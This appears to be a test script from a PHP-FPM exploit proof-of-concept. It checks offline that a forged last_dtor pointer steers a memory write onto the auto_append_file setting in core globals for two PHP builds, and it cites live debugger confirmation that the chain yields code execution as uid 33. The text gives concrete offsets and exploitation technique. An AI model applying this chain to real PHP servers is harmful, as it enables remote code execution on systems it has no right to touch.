#!/usr/bin/env python3
"""Verify bss_last_dtor_forge.py -- the fake-free last_dtor->.bss forge for the
clean auto_append (.bss) dispatch finisher.

Claims under test (offline arithmetic, no lab):
  1. With last_dtor = binbase+error_prepend_off (cg+0x98), whose live qword is 0
     (S=0), tmp_var() lands the write exactly at PG(auto_append_file) (cg+0xa8).
  2. The i:<int> zval type lane (IS_LONG @ dest+8) lands on input_encoding
     (cg+0xb0).
  3. Holds for both the 8.3.26-fpm (reference build) and 8.4.26-fpm field offsets.

Live corroboration (gdb, cw-fpm 8.4.26, NOT run here): calling the real
var_tmp_var with a forged last_dtor=cg+0x98 returned exactly auto_append and
incremented *(cg+0x98) 0->1; cg+0x90..0xc0 read all-zero on a live worker
(S=0 + benign collateral). The clean auto_append dispatch itself fires uid=33
(poc/primitives/write/fpm_clean_pg_write.py, profile cw).

Run:
    python3 -I verify_bss_last_dtor_forge.py
"""
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import bss_last_dtor_forge as m  # noqa: E402


def _case(name, cg, binbase):
    off = {"core_globals_off": cg, "error_prepend_off": cg + 0x98,
           "auto_append_off": cg + 0xa8, "input_encoding_off": cg + 0xb0}
    carrier = 0x7f3a4ec00000 + 0x67000
    _, info = m.forge_bss_autoappend(0x2000, carrier, binbase, off,
                                     carrier + 0x1800)
    aa = binbase + off["auto_append_off"]
    land = info["dest"] == aa
    typ = (info["dest"] + 8) == binbase + off["input_encoding_off"]
    ld = info["last_dtor"] == binbase + off["error_prepend_off"]
    ok = land and typ and ld
    print(f"[{name}] dest {info['dest']:#x} == auto_append {aa:#x} "
          f"(type->input_encoding, last_dtor==cg+0x98)  {'PASS' if ok else 'FAIL'}")
    return ok


def main():
    ok = True
    ok &= _case("8.4.26-fpm", 0x16e1580, 0x5c1f11e00000)
    ok &= _case("8.3.26-fpm", 0x16203e0, 0x5dbcd7000000)
    print("PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
